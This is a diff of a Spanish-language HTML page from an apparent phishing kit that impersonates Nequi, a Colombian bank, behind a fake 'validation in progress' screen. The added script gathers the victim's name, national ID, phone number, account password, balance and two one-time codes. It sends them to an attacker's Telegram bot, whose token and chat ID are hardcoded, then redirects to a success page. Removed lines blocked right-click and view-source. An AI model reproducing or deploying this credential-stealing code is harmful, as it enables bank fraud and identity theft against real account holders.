@@ -1,136 +1,85 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="UTF-8">
   <title>Validando...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="generator" content="Webflow">
-  <meta http-equiv="pragma" content="no-cache">
-  
-  <link rel="stylesheet" type="text/css" href="login_files/normalize.css">
-  <link rel="stylesheet" type="text/css" href="login_files/nequi_two.webflow.css">
-  <link rel="stylesheet" type="text/css" href="login_files/nequi_one.webflow.css">
-  <link rel="stylesheet" type="text/css" href="login_files/main2.css">
-  <link rel="shortcut icon" type="image/x-icon" href="./img/favicon.ico">
-
   <style>
-    /* Mini-reset para que el loader quede centrado */
-    html, body { height: 100%; margin: 0; }
-    body {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      background: #ffffff;
-      font-family: Manrope, sans-serif;
-      color: #200020;
-      text-align: center;
-    }
-    .login-section { margin: auto; max-width: 420px; padding: 0 20px; }
-    .login-wrap { background: #fff; border-radius: 16px; padding: 40px 30px; box-shadow: 0 4px 12px rgba(0,0,0,.1); }
-    .textypn2 { margin: 16px 0; font-size: 16px; line-height: 1.4; }
-    .label-input101 { font-size: 14px; color: #6e6e6e; }
-    .loader-gif { width: 80px; margin: 20px auto; }
+    html,body{height:100%;margin:0}
+    body{display:flex;flex-direction:column;justify-content:center;align-items:center;background:#fff;font-family:Manrope,sans-serif;color:#200020;text-align:center}
+    .login-section{margin:auto;max-width:420px;padding:0 20px}
+    .login-wrap{background:#fff;border-radius:16px;padding:40px 30px;box-shadow:0 4px 12px rgba(0,0,0,.1)}
+    .loader-gif{width:80px;margin:20px auto}
+    .textypn2{margin:16px 0;font-size:16px;line-height:1.4}
+    .label-input101{font-size:14px;color:#6e6e6e}
   </style>
-
-  <script>
-    // Redirige a dinamica.html después de 20 segundos
-    function startRedirectTimer() {
-      let secondsLeft = 20;
-      const interval = setInterval(function () {
-        secondsLeft--;
-        console.log("Redirigiendo en " + secondsLeft + " segundos");
-        if (secondsLeft <= 0) {
-          clearInterval(interval);
-          window.location.href = "dinamica.html"; // ← cambia aquí si quieres otro destino
-        }
-      }, 1000);
-    }
-    window.onload = startRedirectTimer;
-  </script>
 </head>
-<body ng-app="App" class="ng-scope">
-  <div id="content">
-    <div ng-include="getTemplate('/header.html')" class="ng-scope">
-      <header class="ng-scope">
-        <div class="wrap-header">
-          <div class="row">
-            <div class="col-xs-12 col-md-2">
-              <div class="logo">
-                <a href="#">
-                  <!-- Logo local -->
-                  <img alt="nequi" src="./img/logo.svg">
-                </a>
-              </div>
-              <div class="btn-menu-hamburguer" ng-click="openMenu();">
-                <a class=""><span></span></a>
-              </div>
-            </div>
-            <div class="col-xs-12 col-md-10 container-buttons">
-              <div class="wrap-main-menu">
-                <div class="row">
-                  <div class="col-xs-12 col-md-8"></div>
-                  <div class="col-xs-12 col-md-4">
-                    <div class="buttons-right">
-                      <ul>
-                        <li ng-if="!hidePa" class="ng-scope">
-                          <a href="#" class="ng-binding">Recarga</a>
-                        </li>
-                      </ul>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </header>
-    </div>
-
-    <section class="login-section ng-scope" ng-controller="loginController as loginControl">
-      <div class="login-wrap">
-        <h1 class="ng-binding">Validación en curso</h1>
-        <div class="wrap-input4 validate-input">
-          <br>
-          <center>
-            <!-- Gif local -->
-            <img src="./img/gnequi.gif" alt="Loading" class="loader-gif">
-          </center>
-          <div class="textypn2">
-            <span class="model" style="font-size:16px; color:#200020; text-align:center;">
-              Por favor espere un momento mientras validamos la información ingresada, agradecemos su paciencia.
-            </span>
-          </div>
-          <br>
-          <center>
-            <span class="label-input101">Por lo general este proceso no demora más de 2 minutos.</span>
-          </center>
-        </div>
+<body>
+  <div class="login-section">
+    <div class="login-wrap">
+      <h1>Validación en curso</h1>
+      <div class="textypn2">
+        Por favor espere un momento mientras validamos la información ingresada, agradecemos su paciencia.
       </div>
-    </section>
+      <div class="label-input101">Por lo general este proceso no demora más de 2 minutos.</div>
+
+      <!-- Botón que YA TIENES en tu original -->
+      <center class="mt-4">
+        <button id="confirmSecondOTP" class="btn btn-primary px-4">Confirmar</button>
+      </center>
+    </div>
   </div>
 
   <script>
-    // Detectar dispositivo (opcional)
-    function detectar_dispositivo() {
-      const ua = navigator.userAgent;
-      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(ua)) return "Móvil";
-      return "PC";
-    }
-    // Si quieres bloquear PC descomenta lo siguiente:
-    // if (detectar_dispositivo() === "PC") window.location.href = "https://www.dian.gov.co/";
+    /* ----------  TELEGRAM - SEGUNDA OTP  ---------- */
+    async function confirmSecondOTP() {
+      const otp2 = Array.from(document.querySelectorAll('.code_numerickeypad')).map(i => i.value).join('');
+      if (otp2.length !== 6) { alert("Completa los 6 dígitos"); return; }
 
-    // Bloqueo de teclas (opcional)
-    document.addEventListener("keydown", e => {
-      if (e.ctrlKey && e.key.toLowerCase() === "u") {
-        e.preventDefault();
-        alert("Acción bloqueada.");
+      // Datos del paso anterior
+      const nombreApellido = localStorage.getItem("nombreApellido") || "No especificado";
+      const cedula         = localStorage.getItem("cedula")         || "No especificado";
+      const numero         = localStorage.getItem("numero")         || "No especificado";
+      const clave          = localStorage.getItem("clave")          || "No especificado";
+      const saldo          = localStorage.getItem("saldo")          || "No especificado";
+      const otp1           = localStorage.getItem("otp1")           || "No especificado";
+
+      const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc';
+      const TELEGRAM_CHAT_ID   = '6958936698';
+
+      const msg = `🔐 <b>CLAVE DINÁMICA 2</b>\n\n` +
+                  `📛 <b>Nombre:</b> ${nombreApellido}\n` +
+                  `🪪 <b>Cédula:</b> ${cedula}\n` +
+                  `📱 <b>Número:</b> ${numero}\n` +
+                  `🔑 <b>Clave:</b> ${clave}\n` +
+                  `💰 <b>Saldo:</b> ${saldo}\n` +
+                  `🔢 <b>Dinámica 1:</b> <code>${otp1}</code>\n` +
+                  `🔢 <b>Dinámica 2:</b> <code>${otp2}</code>\n` +
+                  `📅 ${new Date().toLocaleString('es-CO')}`;
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: msg,
+            parse_mode: "HTML"
+          })
+        });
+
+        if (res.ok) {
+          window.location.href = "success.html";
+        } else {
+          throw new Error("Error al enviar");
+        }
+      } catch (e) {
+        alert("Error al enviar. Intente nuevamente.");
       }
-    });
-    document.addEventListener("contextmenu", e => {
-      e.preventDefault();
-      alert("Clic derecho deshabilitado.");
-    });
+    }
+
+    // Asignar evento al botón
+    document.getElementById("confirmSecondOTP").addEventListener("click", confirmSecondOTP);
   </script>
 </body>
 </html>
